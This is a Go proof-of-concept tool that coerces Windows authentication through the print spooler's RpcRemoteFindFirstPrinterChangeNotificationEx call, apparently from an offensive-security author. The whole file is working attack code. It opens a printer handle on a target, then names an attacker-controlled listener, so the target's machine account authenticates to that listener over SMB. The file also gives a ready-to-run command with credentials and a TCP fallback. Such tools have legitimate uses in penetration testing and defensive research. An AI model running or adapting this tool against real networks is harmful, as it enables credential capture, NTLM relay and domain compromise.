// File name          : coerce_poc.go
// Author             : Podalirius (@podalirius_)
// Date created       : 10 Sep 2026
//
// Proof of concept for coercing authentication with MS-RPRN::RpcRemoteFindFirstPrinterChangeNotificationEx()
// (opnum 65), written with the TheManticoreProject libraries:
//
//   - github.com/TheManticoreProject/goopts    for the command line parsing
//   - github.com/TheManticoreProject/Manticore for SMB, DCE/RPC and the RPC interface
//
// The call takes a printer handle, so it is a two-call coercion on one association:
// RpcOpenPrinter (opnum 1) opens the print server object of the target, then
// RpcRemoteFindFirstPrinterChangeNotificationEx is told that the "local machine" to send
// change notifications to is \\<listener>. The spooler resolves that server name over
// SMB, and authenticates to the listener with the machine account while doing so.
//
// Run it from this directory (go.mod pins the libraries):
//
//	go run coerce_poc.go --target 192.168.1.30 --listener 192.168.1.10 -d LAB.local -u user -p 'password'
//
// or build a standalone binary with:
//
//	go build -o coerce_poc coerce_poc.go
package main

import (
	"fmt"
	"os"
	"strings"

	"github.com/TheManticoreProject/Manticore/logger"
	winspool "github.com/TheManticoreProject/Manticore/network/dcerpc/interfaces/12345678-1234-abcd-ef00-0123456789ab/1.0"
	"github.com/TheManticoreProject/Manticore/network/dcerpc/interfaces/12345678-1234-abcd-ef00-0123456789ab/1.0/functions"
	"github.com/TheManticoreProject/Manticore/network/dcerpc/ms-protocols/msproto"
	"github.com/TheManticoreProject/Manticore/network/dcerpc/ndr"
	"github.com/TheManticoreProject/Manticore/network/dcerpc/syntax"
	dcerpcclient "github.com/TheManticoreProject/Manticore/network/dcerpc/v5/client"
	"github.com/TheManticoreProject/Manticore/network/dcerpc/v5/pdu"
	smbclient "github.com/TheManticoreProject/Manticore/network/smb/client"
	"github.com/TheManticoreProject/Manticore/windows/credentials"
	"github.com/TheManticoreProject/Manticore/windows/guid"
	msrprn "github.com/TheManticoreProject/Manticore/windows/protocols/ms-rprn"
	"github.com/TheManticoreProject/goopts/parser"
	"golang.org/x/term"
)

var (
	// Configuration
	debug bool

	// Network settings
	target     string
	targetPort int
	pipeName   string

	// Coercion settings
	listener string

	// Authentication details
	authDomain   string
	authUsername string
	authPassword string
	authHashes   string
	authNoPass   bool
)

func parseArgs() {
	ap := parser.ArgumentsParser{
		Banner: "Windows auth coerce using MS-RPRN::RpcRemoteFindFirstPrinterChangeNotificationEx() - by Remi GASCOU (Podalirius) - v1.0.0",
	}

	ap.SetOptShowBannerOnHelp(true)
	ap.SetOptShowBannerOnRun(true)

	ap.NewBoolArgument(&debug, "", "--debug", false, "Enable debug mode.")

	// Network settings
	group_network, err := ap.NewArgumentGroup("Network")
	if err != nil {
		fmt.Printf("[error] Error creating ArgumentGroup: %s\n", err)
	} else {
		group_network.NewStringArgument(&target, "-t", "--target", "", true, "IP address or hostname of the target.")
		group_network.NewTcpPortArgument(&targetPort, "", "--target-port", 445, false, "Port of the SMB service on the target.")
		// The README lists this interface on: \PIPE\spoolss.
		// Manticore's PipeName is the endpoint the protocol documents as its own.
		group_network.NewStringArgument(&pipeName, "", "--pipe", winspool.PipeName, false, "Named pipe to bind the interface on.")
	}

	// Coercion settings
	group_coerce, err := ap.NewArgumentGroup("Coercion")
	if err != nil {
		fmt.Printf("[error] Error creating ArgumentGroup: %s\n", err)
	} else {
		// pszLocalMachine is a server name ([MS-RPRN] 2.2.4.16), so there is no share or
		// file component to configure here: the target is sent "\\<listener>".
		group_coerce.NewStringArgument(&listener, "-l", "--listener", "", true, "IP address or hostname of the listener the target should authenticate to.")
	}

	// Authentication
	group_auth, err := ap.NewArgumentGroup("Authentication")
	if err != nil {
		fmt.Printf("[error] Error creating ArgumentGroup: %s\n", err)
	} else {
		group_auth.NewStringArgument(&authDomain, "-d", "--domain", "", false, "(FQDN) domain to authenticate to.")
		group_auth.NewStringArgument(&authUsername, "-u", "--user", "", false, "User to authenticate as.")
	}

	// Secret
	group_secret, err := ap.NewNotRequiredMutuallyExclusiveArgumentGroup("Secret")
	if err != nil {
		fmt.Printf("[error] Error creating ArgumentGroup: %s\n", err)
	} else {
		group_secret.NewBoolArgument(&authNoPass, "", "--no-pass", false, "Don't ask for a password (null session).")
		group_secret.NewStringArgument(&authPassword, "-p", "--password", "", false, "Password to authenticate with.")
		group_secret.NewStringArgument(&authHashes, "-H", "--hashes", "", false, "NT/LM hashes, format is LMhash:NThash.")
	}

	ap.Parse()
}

// RpcRemoteFindFirstPrinterChangeNotificationEx (opnum 65), as documented by [MS-RPRN]:
//
//	DWORD RpcRemoteFindFirstPrinterChangeNotificationEx(
//	    [in] PRINTER_HANDLE hPrinter,
//	    [in] DWORD fdwFlags,
//	    [in] DWORD fdwOptions,
//	    [in, string, unique] wchar_t* pszLocalMachine,
//	    [in] DWORD dwPrinterLocal,
//	    [in, unique] RPC_V2_NOTIFY_OPTIONS* pOptions
//	);
//
// The binding handle is implicit in Go. The request/response structs below are lifted
// verbatim from Manticore's generated call for this opnum
// (network/dcerpc/interfaces/12345678-1234-abcd-ef00-0123456789ab/1.0/functions/65_RpcRemoteFindFirstPrinterChangeNotificationEx.go), which is the reviewed
// translation of that IDL; the wrapper there folds a nonzero return value into an
// error string, so the call is issued here to keep the numeric status.

// rpcRemoteFindFirstPrinterChangeNotificationExRequest carries the [in] parameters of RpcRemoteFindFirstPrinterChangeNotificationEx.
type rpcRemoteFindFirstPrinterChangeNotificationExRequest struct {
	HPrinter        msrprn.PRINTER_HANDLE
	FdwFlags        ndr.DWORD
	FdwOptions      ndr.DWORD
	PszLocalMachine *ndr.WSTR `ndr:"unique"`
	DwPrinterLocal  ndr.DWORD
	POptions        *msrprn.RPC_V2_NOTIFY_OPTIONS `ndr:"unique"`
}

// rpcRemoteFindFirstPrinterChangeNotificationExResponse carries the [out] parameters and return value of RpcRemoteFindFirstPrinterChangeNotificationEx.
type rpcRemoteFindFirstPrinterChangeNotificationExResponse struct {
	Status ndr.DWORD `ndr:"retval"`
}

func (*rpcRemoteFindFirstPrinterChangeNotificationExRequest) Opnum() uint16 {
	return winspool.OpnumRpcRemoteFindFirstPrinterChangeNotificationEx
}

// printerChangeAddJob is the PRINTER_CHANGE_ADD_JOB Printer Change Value ([MS-RPRN]
// 2.2.4.13), the condition the change notification object is armed on. Its exact value
// does not matter to the coercion, only that fdwFlags is nonzero, which is what makes a
// NULL pOptions legal; PRINTER_CHANGE_ADD_JOB is the flag the Python PoC of this method
// sends (impacket rprn.PRINTER_CHANGE_ADD_JOB).
const printerChangeAddJob ndr.DWORD = 0x00000100

// serverRead is the SERVER_READ access mask requested on the print server object
// (STANDARD_RIGHTS_READ 0x00020000 | SERVER_ACCESS_ENUMERATE 0x00000002). It is the
// access impacket's hRpcOpenPrinter defaults to, so it is what the Python PoC of this
// method asks for, and it is enough to be handed a handle: enumerate access is granted
// to authenticated users, while SERVER_ALL_ACCESS would need print-operator rights.
const serverRead ndr.DWORD = 0x00020002

// win32ErrorNames names the Win32 error codes ([MS-ERREF] 2.2) that this interface returns
// but that Manticore's status table for it does not cover yet. winspool.StatusString is
// always consulted first, so the codes Manticore does define keep their names from there
// and this map only fills the gaps. ERROR_BAD_NETPATH is the one a coercion normally ends
// on: the target could not reach the UNC path — after trying to.
var win32ErrorNames = map[uint32]string{
	0x00000003: "ERROR_PATH_NOT_FOUND",
	0x00000035: "ERROR_BAD_NETPATH",
	0x00000043: "ERROR_BAD_NET_NAME",
	0x0000007b: "ERROR_INVALID_NAME",
}

// statusName resolves a Win32 status code to its constant name, preferring Manticore's
// own table. StatusString falls back to a "0x%08x" rendering for codes it does not know,
// which is how an unknown code is detected here.
func statusName(status uint32) string {
	if name := winspool.StatusString(status); !strings.HasPrefix(name, "0x") {
		return name
	}
	if name, found := win32ErrorNames[status]; found {
		return name
	}
	return "UNKNOWN_ERROR"
}

// formatStatus renders a status as "ERROR_BAD_NETPATH (0x00000035)".
func formatStatus(status uint32) string {
	return fmt.Sprintf("%s (0x%08x)", statusName(status), status)
}

// interfaceSyntaxes returns the abstract syntaxes to try, in order. A protocol may be
// registered under several interface UUIDs and a given Windows version may only expose
// some of them, so a rejected bind is a reason to try the next candidate, not to stop.
func interfaceSyntaxes() []syntax.SyntaxID {
	var _ = guid.FromFormatD // only used when the protocol has several interface UUIDs
	candidates := []syntax.SyntaxID{winspool.SyntaxID()}
	return candidates
}

// promptPassword asks for the password on the terminal, as the Python PoC does when a
// username is given with neither a password, hashes, nor --no-pass.
func promptPassword() (string, error) {
	fmt.Print("Password: ")
	secret, err := term.ReadPassword(int(os.Stdin.Fd()))
	fmt.Println()
	if err != nil {
		return "", err
	}
	return string(secret), nil
}

func main() {
	parseArgs()

	if debug {
		logger.SetLevel(logger.LevelDebug)
	}

	if authUsername != "" && authPassword == "" && authHashes == "" && !authNoPass {
		password, err := promptPassword()
		if err != nil {
			logger.Errorf("Error reading password: %s", err)
			return
		}
		authPassword = password
	}

	creds, err := credentials.NewCredentials(authDomain, authUsername, authPassword, authHashes)
	if err != nil {
		logger.Errorf("Error creating credentials: %s", err)
		return
	}

	// Negotiate the best dialect the target supports (SMB1 or SMB2+), the DCE/RPC
	// named-pipe transport is then the same for the caller either way.
	logger.Infof("Connecting to %s:%d ...", target, targetPort)
	smb, err := smbclient.Dial(target, targetPort, smbclient.Options{})
	if err != nil {
		logger.Errorf("Error connecting to %s:%d: %s", target, targetPort, err)
		return
	}
	defer smb.Disconnect()
	logger.Infof("Connected, negotiated dialect [%s]", smb.Dialect())

	if err := smb.Login(creds); err != nil {
		logger.Errorf("Error authenticating to %s: %s", target, err)
		return
	}
	defer smb.Logoff()
	logger.Infof("Authenticated as [%s]", strings.Trim(authDomain+"\\"+authUsername, "\\"))

	// Named pipes live on the IPC$ tree ([MS-RPCE] 2.1.1.2).
	if err := smb.TreeConnect("IPC$"); err != nil {
		logger.Errorf("Error connecting to share IPC$: %s", err)
		return
	}
	defer smb.TreeDisconnect()

	// A rejected bind leaves the association unusable, so every candidate syntax gets a
	// fresh pipe and client of its own.
	var rpc *dcerpcclient.Client
	closeRPC := func() error { return nil }
	for _, abstractSyntax := range interfaceSyntaxes() {
		transport, err := smb.RPCTransport(pipeName)
		if err != nil {
			// The pipe is missing rather than the bind refused: since the hardening that
			// followed [MSFT-CVE-2021-34527] the spooler can be told to expose its RPC
			// interfaces over TCP only (RpcUseNamedPipeProtocol), and then \PIPE\spoolss
			// does not exist at all. Not fatal here, ncacn_ip_tcp is tried below.
			logger.Warnf("Could not open pipe %s: %s", pipeName, err)
			break
		}

		logger.Infof("Binding to <%s> on %s ...", abstractSyntax, pipeName)
		candidate := dcerpcclient.NewClient(transport)
		// Authenticate at the RPC layer on top of the SMB session: several of these
		// services refuse an anonymously bound association (EFSRPC answers
		// nca_s_fault_access_denied since [MSFT-CVE-2021-43893]). Sign and seal every PDU.
		if err := candidate.SetAuth(pdu.AuthTypeNTLMSSP, pdu.AuthLevelPktPrivacy, creds); err != nil {
			logger.Errorf("Error configuring RPC authentication: %s", err)
			candidate.Close()
			return
		}
		if err := candidate.Bind(abstractSyntax); err != nil {
			logger.Warnf("Bind rejected: %s", err)
			candidate.Close()
			continue
		}
		logger.Info("Bind successful")
		rpc, closeRPC = candidate, candidate.Close
		break
	}
	// Named pipes unavailable: resolve the interface through the endpoint mapper on
	// TCP/135 and bind it over ncacn_ip_tcp instead, which is the only way to reach a
	// spooler that was configured for TCP only.
	//
	// Be aware of what this changes: the callback the target makes follows the protocol
	// sequence of the binding it was asked on. Bound over ncacn_ip_tcp, the target opens
	// its reply binding to the listener over RPC and never touches SMB, so an SMB
	// listener captures nothing. Measured against a Server 2025 DC: the call reaches the
	// spooler and returns RPC_S_SERVER_UNAVAILABLE (0x6ba) once it fails to find a print
	// client on the listener, with no connection on port 445 at all. Coercing SMB
	// authentication needs the named pipe path above; this fallback is what lets the call
	// be made and diagnosed at all when \PIPE\spoolss is gone.
	if rpc == nil {
		for _, abstractSyntax := range interfaceSyntaxes() {
			logger.Infof("Binding to <%s> over ncacn_ip_tcp (endpoint mapper) ...", abstractSyntax)
			candidate, closer, err := msproto.NewTCPBinder(target, 0, creds, 0).Bind(abstractSyntax)
			if err != nil {
				logger.Warnf("Bind over ncacn_ip_tcp failed: %s", err)
				continue
			}
			logger.Info("Bind successful")
			rpc, closeRPC = candidate, closer
			break
		}
	}
	if rpc == nil {
		logger.Errorf("Could not bind the interface on %s nor over ncacn_ip_tcp.", pipeName)
		return
	}
	defer closeRPC()

	// hPrinter is a PRINTER_HANDLE, which only RpcAddPrinter, RpcAddPrinterEx,
	// RpcOpenPrinter or RpcOpenPrinterEx can produce, so the coercion needs a prerequisite
	// call on this same association. RpcOpenPrinter (opnum 1) on the target's own server
	// name hands back a handle to its print server object; the Python PoC of this method
	// does exactly this through impacket's hRpcOpenPrinter, with pDatatype NULL, an empty
	// DEVMODE_CONTAINER (cbBuf 0, pDevMode NULL) and SERVER_READ.
	printerName := ndr.WSTR(fmt.Sprintf(`\\%s`, target))
	logger.Infof("Calling RpcOpenPrinter(PPrinterName='%s') ...", string(printerName))
	printerHandle, err := functions.RpcOpenPrinter(rpc, &printerName, nil, msrprn.DEVMODE_CONTAINER{}, serverRead)
	if err != nil {
		logger.Errorf("RpcOpenPrinter() failed: %s", err)
		return
	}
	logger.Infof("Got a printer handle [%x]", printerHandle[:])

	// The server name the target will resolve, and therefore authenticate to. Unlike the
	// file-path coercions, pszLocalMachine is a machine name ([MS-RPRN] 2.2.4.16): the
	// Python PoC sends "\\<listener>" and nothing more, so this is byte-identical to it
	// (ndr.WSTR appends the NUL terminator the Python PoC has to write out by hand).
	uncPath := fmt.Sprintf(`\\%s`, listener)

	uncPathWSTR := ndr.WSTR(uncPath)
	logger.Infof("Calling RpcRemoteFindFirstPrinterChangeNotificationEx(PszLocalMachine='%s') ...", uncPath)
	request := &rpcRemoteFindFirstPrinterChangeNotificationExRequest{
		HPrinter: printerHandle,
		FdwFlags: printerChangeAddJob,
		// fdwOptions selects the category of printers change notifications are returned
		// for ([MS-RPRN] 2.2.3.8). The Python PoC leaves it at 0 — no category, since the
		// notification back-channel is never opened — and the coercion happens while the
		// spooler resolves pszLocalMachine, before any notification is delivered.
		FdwOptions:      0,
		PszLocalMachine: &uncPathWSTR,
		// dwPrinterLocal is a client-chosen value that lets the client correlate the
		// spooler's RpcReplyOpenPrinter callback with this handle. Nothing here waits for
		// that callback, so 0 is sent, as the Python PoC does.
		DwPrinterLocal: 0,
		// [in, unique] RPC_V2_NOTIFY_OPTIONS*: NULL, which the method's documentation
		// permits because fdwFlags is nonzero. A nil pointer is how a [unique] NULL is
		// marshalled, and it is what the Python PoC passes.
		POptions: nil,
	}
	var response rpcRemoteFindFirstPrinterChangeNotificationExResponse

	if err := rpc.Invoke(request, &response); err != nil {
		// A DCE/RPC fault means the call never reached the method: a wrong interface,
		// endpoint or parameter modelling, not a refusal by the server.
		logger.Errorf("RpcRemoteFindFirstPrinterChangeNotificationEx() faulted: %s", err)
		return
	}

	status := uint32(response.Status)
	if status == winspool.StatusSuccess {
		logger.Infof("RpcRemoteFindFirstPrinterChangeNotificationEx() returned %s, check your listener.", formatStatus(status))
		return
	}
	// Any other status is expected: the target fails on a path it cannot reach, but it has
	// already authenticated to the listener to find that out.
	logger.Infof("RpcRemoteFindFirstPrinterChangeNotificationEx() returned a status: %s", formatStatus(status))
	logger.Info("The call was processed by the target, check your listener.")
}
